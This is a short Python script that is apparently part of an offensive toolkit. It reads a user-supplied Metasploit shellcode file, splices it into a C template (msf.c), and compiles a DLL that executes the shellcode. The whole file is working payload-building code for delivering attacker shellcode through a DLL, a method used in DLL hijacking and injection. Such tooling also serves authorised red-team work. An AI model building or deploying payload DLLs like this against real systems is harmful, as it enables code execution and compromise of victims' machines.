"""
Have a good time reading the source. You're an amazing person.
If you decide to copy, Don't forget to give me credit.
"""


import subprocess
import os
# https://stackoverflow.com/a/17548459/13429494
def inplace_change(filename, old_string, new_string):
    # Safely read the input filename using 'with'
    with open(filename) as f:
        s = f.read()
        if old_string not in s:
            #print('"{old_string}" not found in {filename}.'.format(**locals()))
            return

    # Safely write the changed content, if found in the file
    with open(filename, 'w') as f:
        #print('Changing "{old_string}" to "{new_string}" in {filename}'.format(**locals()))
        s = s.replace(old_string, new_string)
        f.write(s)

def build_msf_dll():
    """
    build dll that executes metasploit shellcode
    """
    shellcodeFile = input("[+] Enter Path to Shellcode file : ")
    if(len(shellcodeFile) > 0):
        try:
            with open(shellcodeFile, "r") as readin_code:
                c_array_msf = readin_code.read()
                print("[+] Using : ")
                print(c_array_msf)

                print("[i] Writing to Source DLL file.")
                inplace_change("msf.c", "{{shellcodehere}}", c_array_msf)
                print("[i] Building DLL.")
                # Mingw32, to support my windows envoironment
                if(os.name == "nt"):
                    subprocess.call(["mingw32-make", "msf"])
                else:
                    subprocess.call(["make", "msf"])

                if(not os.path.isfile("msf.dll")):
                    print("[X] An Error occured when building Dll.")
                else:
                    inplace_change("msf.c", c_array_msf, "{{shellcodehere}}")

        except Exception as e:
            print("[X] Error : " + str(e))
